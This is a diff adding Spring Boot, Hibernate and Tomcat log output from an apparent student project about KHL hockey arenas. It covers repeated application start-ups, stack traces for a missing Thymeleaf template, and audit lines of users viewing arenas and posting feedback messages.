@@ -1724,3 +1724,1365 @@ java.lang.IllegalArgumentException: Invalid character found in method name [0x16
 06-05-2024 10:41:08 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
 06-05-2024 10:41:08 INFO  HikariPool-1 - Shutdown initiated...
 06-05-2024 10:41:08 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 11:25:24 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 37181 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 11:25:24 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 11:25:24 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 11:25:25 INFO  Finished Spring Data repository scanning in 55 ms. Found 5 JPA repository interfaces.
+06-05-2024 11:25:25 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 11:25:25 INFO  Starting service [Tomcat]
+06-05-2024 11:25:25 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 11:25:25 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 11:25:25 INFO  Root WebApplicationContext: initialization completed in 1296 ms
+06-05-2024 11:25:25 INFO  HikariPool-1 - Starting...
+06-05-2024 11:25:26 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@6274f21c
+06-05-2024 11:25:26 INFO  HikariPool-1 - Start completed.
+06-05-2024 11:25:26 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 11:25:26 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 11:25:26 INFO  HHH000026: Second-level cache disabled
+06-05-2024 11:25:26 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 11:25:26 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 11:25:27 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 11:25:27 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 11:25:27 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 11:25:27 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 11:25:27 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@30cb489a, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@401d83ce, org.springframework.security.web.context.SecurityContextHolderFilter@7552f05b, org.springframework.security.web.header.HeaderWriterFilter@6889e714, org.springframework.web.filter.CorsFilter@3b7b099b, org.springframework.security.web.authentication.logout.LogoutFilter@6bc08a77, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@6250d33c, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@322593ed, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@67062a93, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@5abc488d, org.springframework.security.web.access.ExceptionTranslationFilter@22f0e329, org.springframework.security.web.access.intercept.AuthorizationFilter@498f1f63]
+06-05-2024 11:25:27 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 11:25:27 INFO  Started KhlArenasProjectApp in 4.047 seconds (process running for 4.385)
+06-05-2024 11:25:37 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 11:25:37 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 11:25:37 INFO  Completed initialization in 1 ms
+06-05-2024 11:25:41 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 11:25:41 ERROR [THYMELEAF][http-nio-8080-exec-6] Exception processing template "allmessages": Error resolving template [allmessages], template might not exist or might not be accessible by any of the configured Template Resolvers
+org.thymeleaf.exceptions.TemplateInputException: Error resolving template [allmessages], template might not exist or might not be accessible by any of the configured Template Resolvers
+	at org.thymeleaf.engine.TemplateManager.resolveTemplate(TemplateManager.java:869)
+	at org.thymeleaf.engine.TemplateManager.parseAndProcess(TemplateManager.java:607)
+	at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1103)
+	at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1077)
+	at org.thymeleaf.spring6.view.ThymeleafView.renderFragment(ThymeleafView.java:372)
+	at org.thymeleaf.spring6.view.ThymeleafView.render(ThymeleafView.java:192)
+	at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1431)
+	at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1167)
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1106)
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979)
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014)
+	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903)
+	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564)
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885)
+	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:206)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108)
+	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:365)
+	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126)
+	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:227)
+	at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:221)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107)
+	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90)
+	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82)
+	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233)
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191)
+	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113)
+	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195)
+	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113)
+	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74)
+	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:230)
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352)
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:344)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:391)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1736)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
+	at java.base/java.lang.Thread.run(Thread.java:1583)
+06-05-2024 11:25:41 ERROR Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed: org.thymeleaf.exceptions.TemplateInputException: Error resolving template [allmessages], template might not exist or might not be accessible by any of the configured Template Resolvers] with root cause
+org.thymeleaf.exceptions.TemplateInputException: Error resolving template [allmessages], template might not exist or might not be accessible by any of the configured Template Resolvers
+	at org.thymeleaf.engine.TemplateManager.resolveTemplate(TemplateManager.java:869)
+	at org.thymeleaf.engine.TemplateManager.parseAndProcess(TemplateManager.java:607)
+	at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1103)
+	at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1077)
+	at org.thymeleaf.spring6.view.ThymeleafView.renderFragment(ThymeleafView.java:372)
+	at org.thymeleaf.spring6.view.ThymeleafView.render(ThymeleafView.java:192)
+	at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1431)
+	at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1167)
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1106)
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979)
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014)
+	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903)
+	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564)
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885)
+	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:206)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108)
+	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:365)
+	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126)
+	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:227)
+	at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:221)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107)
+	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90)
+	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82)
+	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374)
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233)
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191)
+	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113)
+	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195)
+	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113)
+	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74)
+	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:230)
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352)
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:175)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:150)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:344)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:391)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1736)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
+	at java.base/java.lang.Thread.run(Thread.java:1583)
+06-05-2024 11:28:48 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 11:28:48 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 11:28:48 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 11:36:45 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 37631 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 11:36:45 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 11:36:46 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 11:36:46 INFO  Finished Spring Data repository scanning in 50 ms. Found 5 JPA repository interfaces.
+06-05-2024 11:36:46 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 11:36:46 INFO  Starting service [Tomcat]
+06-05-2024 11:36:46 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 11:36:46 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 11:36:46 INFO  Root WebApplicationContext: initialization completed in 1200 ms
+06-05-2024 11:36:46 INFO  HikariPool-1 - Starting...
+06-05-2024 11:36:47 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@7cf63b9a
+06-05-2024 11:36:47 INFO  HikariPool-1 - Start completed.
+06-05-2024 11:36:47 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 11:36:47 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 11:36:47 INFO  HHH000026: Second-level cache disabled
+06-05-2024 11:36:47 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 11:36:47 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 11:36:48 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 11:36:48 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 11:36:48 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 11:36:48 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 11:36:48 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@6bc08a77, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@37922937, org.springframework.security.web.context.SecurityContextHolderFilter@26caf4b6, org.springframework.security.web.header.HeaderWriterFilter@5776a9f8, org.springframework.web.filter.CorsFilter@73483d4b, org.springframework.security.web.authentication.logout.LogoutFilter@3f67f5ff, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@951461a, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@2c750b69, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@159a0f0e, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@8961e55, org.springframework.security.web.access.ExceptionTranslationFilter@5eadc347, org.springframework.security.web.access.intercept.AuthorizationFilter@58701e8c]
+06-05-2024 11:36:49 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 11:36:49 INFO  Started KhlArenasProjectApp in 3.98 seconds (process running for 4.325)
+06-05-2024 11:36:56 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 11:36:56 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 11:36:56 INFO  Completed initialization in 1 ms
+06-05-2024 11:36:59 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 11:38:16 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 11:38:33 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=Что-то пропало)]
+06-05-2024 11:38:33 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 11:38:33 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 11:39:37 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=Спасибо за хороший сайт! Продолжайте в том же духе!)]
+06-05-2024 11:39:37 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 11:39:37 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 11:39:55 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 11:40:12 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 11:40:12 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 11:40:12 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 11:40:16 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 38204 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 11:40:16 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 11:40:16 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 11:40:16 INFO  Finished Spring Data repository scanning in 50 ms. Found 5 JPA repository interfaces.
+06-05-2024 11:40:17 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 11:40:17 INFO  Starting service [Tomcat]
+06-05-2024 11:40:17 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 11:40:17 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 11:40:17 INFO  Root WebApplicationContext: initialization completed in 1270 ms
+06-05-2024 11:40:17 INFO  HikariPool-1 - Starting...
+06-05-2024 11:40:17 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@1a7cb3a4
+06-05-2024 11:40:17 INFO  HikariPool-1 - Start completed.
+06-05-2024 11:40:17 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 11:40:17 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 11:40:17 INFO  HHH000026: Second-level cache disabled
+06-05-2024 11:40:18 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 11:40:18 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 11:40:18 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 11:40:18 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 11:40:19 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 11:40:19 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
